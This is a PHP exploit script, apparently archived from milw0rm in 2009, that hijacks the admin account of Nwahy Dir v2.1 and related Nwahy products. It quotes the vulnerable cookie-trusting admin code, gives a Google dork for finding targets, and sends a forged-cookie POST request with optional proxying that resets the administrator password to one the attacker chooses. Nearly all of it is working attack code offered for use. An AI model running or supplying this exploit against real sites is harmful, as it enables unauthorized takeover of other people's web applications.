<?

	/*

			[ Nwahy Dir v2.1 Change Admin Password Exploit ]         
			
		[-] Author        : rEcruit
		[-] Mail            : recru1t[@]ymail.com
		[-] Download   : http://nwahy.com/showdownload-3105.html
		
		[-] Vuln in  ./admincp/admininfo.php
		
			[code]
			
			$u = addslashes($_COOKIE['username']);
			$query = mysql_query ("SELECT * FROM `dlil_admin` WHERE username='$u' AND adminoruser='0'") or die ("Query failed");
			$counts = mysql_num_rows($query);
			if($counts == 0){
			echo "<div align='center'>......................</div>";
			}else{
				
			[/code]
			
		[-] Works On :
		
			1. Nwahy Articles v1
				
			2. Nwahy scripts v1

			3. Nwahy book v1
			
		[-] Note : Path to Control Panel   "/admincp/" .

	*/

	error_reporting(0);
	ini_set("max_execution_time",0);
	ini_set("default_socket_timeout",5);


	function Usage()
	{
			print "\n\n";
			print "/------------------------------------------------------------\\\n";
			print "|        Nwahy Dir v2.1 Change Admin Password Exploit        |\n";
			print "\------------------------------------------------------------/\n";
			print "| [-] Author : rEcruit                                       |\n";
			print "| [-] Mail   : recru1t@ymail.com                             |\n";
			print "| [-] Greetz : RAGE SCREAM  , SAUDI L0rD , Fantastic Egypt   |\n";
			print "\------------------------------------------------------------/\n";
			print "| [-] Dork     : Nwahy.com 2.1 , inurl:'add-site.html'       |\n";
			print "| [+] Usage    : php Exploit.php HOST PATH Options           |\n";
			print "| [-] HOST     : Target server (ip/hostname)                 |\n";
			print "| [-] PATH     : Path to Nwahy Dir                           |\n";
			print "| [-] Options  :                                             |\n";
			print "|     =>Proxy  :(ex. 0.0.0.0:8080)                           |\n";
			print "\------------------------------------------------------------/\n";
			print "\n\n";

		exit;
	}


	function Send()
	{
		Global $host,$path,$user,$pwd,$proxy;
		
		if(empty($proxy))
		{
			$Connect	= @fsockopen($host,"80") or die("[-] Bad Host .");
		}else{
			$proxy		= explode(":",$proxy);
			$Connect	= @fsockopen($proxy[0],$proxy[1]) or die("[-] Bad Proxy .");
		}
		
			$Payload	= "username={$user}&password={$pwd}";
			$Packet		.= "POST {$path}/admincp/admininfo.php?action=edit HTTP/1.1 \r\n";
			$Packet		.= "Host: {$host}\r\n";
			$Packet		.= "Cookie: username={$user}\r\n";
			$Packet		.= "X-Forwarded-For: 127.0.0.1\r\n";
			$Packet		.= "Content-Type: application/x-www-form-urlencoded\r\n";
			$Packet		.= "Content-Length: ".(strlen($Payload))."\r\n";
			$Packet		.= "Connection: close\r\n\r\n";
			$Packet		.= $Payload;

				fputs($Connect,$Packet);

				while(!feof($Connect)) 
				$Response	.= @fgets($Connect,2048);

				fclose($Connect);
		
		return $Response;
	}
	
	
	function Login()
	{
		$Response	= @Send();

			if(eregi("refresh",$Response))
			{
				$msg	= "[-] Password changed .\n";
			}
			elseif(eregi("<div align='center'>",$Response))
			{
				$msg	= "[-] Bad username .\n";
			}
			else
			{
				$msg	= "[-] Exploit failed .\n";
			}

		return $msg;
	}



	if ($argc < 3) Usage();

	$host	= $argv[1];
	$path	= $argv[2];;
	$proxy	= $argv[3];

	
		Print "\r\n[-] Connecting to {$host} .... \r\n";
		
		while(1)
		{
			Print "[-] Username: ";

			if($user = str_replace (" ", "%20", trim(fgets(STDIN))))
			{
				Print "[-] New password: ";

				if($pwd = str_replace (" ", "%20", trim(fgets(STDIN))))
				{
					Print Login();
					exit;
				}


			}


		} //end while

?>

# milw0rm.com [2009-07-09]
